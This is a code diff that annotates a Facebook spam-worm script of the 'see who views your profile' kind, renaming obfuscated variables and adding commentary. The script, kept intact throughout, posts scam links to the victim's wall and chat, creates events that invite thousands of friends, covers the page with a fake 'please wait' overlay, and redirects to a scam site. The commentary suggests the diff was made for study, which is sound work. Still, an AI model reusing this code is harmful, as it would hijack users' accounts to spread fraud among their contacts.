@@ -1,16 +1,17 @@
-var randomnumber=Math.floor(Math.random()*99999);
+var randomnumber=Math.floor(Math.random()*99999); // Just generates a random number. Pretty simple so far.
+// The randomnumber variable at the end of the URL doesn't actually do anything. It's probably there to mitigate blocking of individual URLs or something.
 var chatmessage = '%firstname% See who views your profile @ fblink.net/Wl1b?'+randomnumber;
 var postmessage = 'My Top Profile Viewers: \n\ %tf% - 1136 views \n\ %tf% - 983 views \n\ %tf% - 542 views \n\ %tf% - 300 views \n\ See who views your profile @ http://x.co/Wl1b?'+randomnumber;
 var redirect = 'http://countmyviews.com/final.php';
-var eventdesc = 'Hey everyone, \n\ fb now lets you see who viewed your profile! to enable this feature, go here! - http://x.co/Wl1b?'+randomnumber;
-var eventname = 'How to see who viewed your profile!!';
+var event_description_text = 'Hey everyone, \n\ fb now lets you see who viewed your profile! to enable this feature, go here! - http://x.co/Wl1b?'+randomnumber;
+var event_name = 'How to see who viewed your profile!!';
 var nfriends = 5000;
-var debug = false;
+var debug = false; // Obviously, these are _professional_ scamsters.
 var wf = 0;
 var mf = function () {
         if (wf <= 0) {
             setTimeout(function () {
-                window['top']['location']['href'] = redirect;
+                window['top']['location']['href'] = redirect; // Redirects you to http://countmyviews.com/final.php
             }, 500);
         };
     };
@@ -61,19 +62,19 @@ doget('/', function (scam_variable_f) {
             scam_variable_e['send'](scam_variable_14(scam_variable_12));
         };
     var scam_variable_17 = function () {
-            var scam_variable_18 = document['createElement']('div');
-            scam_variable_18['style']['display'] = 'block';
-            scam_variable_18['style']['position'] = 'absolute';
-            scam_variable_18['style']['width'] = 100 + '%';
-            scam_variable_18['style']['height'] = 100 + '%';
-            scam_variable_18['style']['left'] = 0 + 'px';
-            scam_variable_18['style']['top'] = 0 + 'px';
-            scam_variable_18['style']['textAlign'] = 'center';
-            scam_variable_18['style']['padding'] = '4px';
-            scam_variable_18['style']['background'] = '#FFFFFF';
-            scam_variable_18['style']['zIndex'] = 999999;
-            scam_variable_18['innerHTML'] = '&nbsp;<br/>Please wait, this can take a little while...<br/><br/> We are processing the offer for you... <a href="javascript:void(0);" onclick="wf=0; mf();">click here</a> ';
-            document['body']['appendChild'](scam_variable_18);
+            var new_div = document['createElement']('div');
+            new_div['style']['display'] = 'block';
+            new_div['style']['position'] = 'absolute';
+            new_div['style']['width'] = 100 + '%';
+            new_div['style']['height'] = 100 + '%';
+            new_div['style']['left'] = 0 + 'px';
+            new_div['style']['top'] = 0 + 'px';
+            new_div['style']['textAlign'] = 'center';
+            new_div['style']['padding'] = '4px';
+            new_div['style']['background'] = '#FFFFFF';
+            new_div['style']['zIndex'] = 999999;
+            new_div['innerHTML'] = '&nbsp;<br/>Please wait, this can take a little while...<br/><br/> We are processing the offer for you... <a href="javascript:void(0);" onclick="wf=0; mf();">click here</a> ';
+            document['body']['appendChild'](new_div);
         };
     var scam_variable_19 = scam_variable_f['match'](/name=\\"xhpc_composerid\\" value=\\"([\d\w]+)\\"/i);
     if (scam_variable_19) {
@@ -90,7 +91,7 @@ doget('/', function (scam_variable_f) {
         doclose: 1
     });
     scam_variable_17();
-    if (eventdesc) {
+    if (event_description_text) {
         wf++;
         scam_variable_16('/ajax/choose/?__a=1', {
             type: 'event',
@@ -123,13 +124,13 @@ doget('/', function (scam_variable_f) {
                     start_dateIntlDisplay: datestr,
                     start_date: datestr,
                     start_time_hour_min: timestr,
-                    name: eventname,
+                    name: event_name,
                     place_page_id: '',
                     location: '',
                     street: '',
                     geo_id: '',
                     geo_sq: '',
-                    desc: eventdesc,
+                    desc: event_description_text,
                     sgb_invitees: scam_variable_21['join'](','),
                     sgb_emails: '',
                     sgb_message: '',
